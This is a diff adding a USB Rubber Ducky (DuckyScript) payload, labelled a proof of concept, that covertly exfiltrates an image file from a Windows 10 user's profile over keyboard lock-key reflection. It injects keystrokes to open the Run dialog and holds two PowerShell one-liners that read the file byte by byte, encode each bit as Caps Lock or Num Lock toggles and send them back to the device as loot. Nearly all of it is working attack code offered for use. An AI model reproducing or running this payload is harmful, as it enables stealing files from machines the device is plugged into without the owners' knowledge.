@@ -1,0 +1,41 @@
+DELAY 3000
+REM Title: Image over key reflection
+REM Author: Cribbit
+REM Description: Proof of concept for send an image over key reflection using two methods 
+REM Target: Windows 10
+REM Props: Korban, Darren, I-Am-Jakoby
+
+REM Config: You will need to change the path to an image at the moment it points to C:\Users\{Current user}\test.jpg
+
+REM Note: this will take forever a 807 bytes file took about 7 mins.
+
+ATTACKMODE HID
+LED_OFF
+DELAY 2000
+SAVE_HOST_KEYBOARD_LOCK_STATE
+$_EXFIL_MODE_ENABLED = TRUE
+$_EXFIL_LEDS_ENABLED = TRUE
+
+GUI r
+DELAY 200
+
+REM The "string method" is fast to encode than the check each bit but is 20 char longer.
+REM This reads the image by bytes converts each byte to a binary string. Pads the string to 8 zero. then replaces the 1 and 0's with the lock keys 
+REM UN-REM THE LINE BELOW TO USES
+REM STRINGLN powershell "gc $env:USERPROFILE\test.jpg -En By|%{$k+=([convert]::ToString($_,2).PadLeft(8,'0')-replace'0','%{CAPSLOCK}'-replace'1','%{NUMLOCK}')};$k+='%{SCROLLLOCK}';Add-Type -A *m.W*s.F*s;[System.Windows.Forms.SendKeys]::SendWait($k)"
+
+REM This bit version it is slightly short then the example payload for hak5. 
+REM By replacing the all hex value that it uses to check each bit agaist each byte. 
+REM by piping 7 down to 0 then left shifing 1 by this value i.e. 1 -shl 7 = (bin 10000000, hex 80 dec 128) to 1 -shl 0 = (bin 00000001, hex 1 dec 1)
+REM UN-REM THE LINE BELOW TO USES
+REM STRINGLN powershell "gc $env:USERPROFILE\test.jpg -En By|%{$b=$_;7..0|%{if($b-band(1-shl$_)){$k+='%{NUMLOCK}'}else{$k+='%{CAPSLOCK}'}}};$k+='%{SCROLLLOCK}';Add-Type -A *m.W*s.F*s;[System.Windows.Forms.SendKeys]::SendWait($k)"
+
+
+WAIT_FOR_SCROLL_CHANGE
+LED_G
+$_EXFIL_MODE_ENABLED = FALSE
+RESTORE_HOST_KEYBOARD_LOCK_STATE
+
+ATTACKMODE STORAGE
+
+REM When storage shows rename the loot.bin extension to the file extension in this case .jpg to view the file.
